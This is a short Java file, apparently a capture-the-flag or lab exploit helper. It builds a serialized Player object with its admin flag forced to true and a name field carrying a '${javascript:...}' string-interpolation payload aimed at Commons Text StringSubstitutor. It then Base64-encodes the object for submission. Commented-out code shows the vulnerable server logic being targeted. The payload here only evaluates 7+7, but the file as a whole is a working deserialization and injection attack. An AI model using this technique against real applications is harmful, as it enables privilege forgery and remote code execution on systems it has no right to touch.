import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.PrintWriter;

class Player implements Serializable {
   private String name = "${javascript:7 + 7}";
   private boolean isAdmin= true;

   public String getName() {
      return this.name;
   }

   public boolean isAdmin() {
      return this.isAdmin;
   }
   public Player() {
   }
   // public String toString() {
   //    String output = "";
   //    if (this.isAdmin()) {
   //       try {
   //          StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();
   //          output = stringSubstitutor.replace(this.name);
   //       } catch (Exception var3) {
   //          output = "???????";
   //       }
   //    }

   //    return "Hello" + output + "!";
   // }
}

public class Test {
    public static void main(String[] args) {
        try {
            // Create a Player object
            Player player = new Player();

            // Serialize the Player object
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(player);
            oos.close();
            byte[] serializedPlayer = baos.toByteArray();

            // Encode the serialized object in Base64
            System.out.println("Serialized player: " + serializedPlayer);
            String encodedPlayer = Base64.getEncoder().encodeToString(serializedPlayer);
            System.out.println(encodedPlayer);

            try {
               byte[] data = Base64.getDecoder().decode(encodedPlayer);
               InputStream is = new ByteArrayInputStream(data);
               ObjectInputStream ois = new ObjectInputStream(is);
               Object obj = ois.readObject();
               ois.close();
               Player user = (Player)obj;
               System.out.println("<h1> Hello: " + user.isAdmin() + " !</h1>");
            } catch (Exception var10) {
               System.out.println("<h1> ????????? </h1>");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
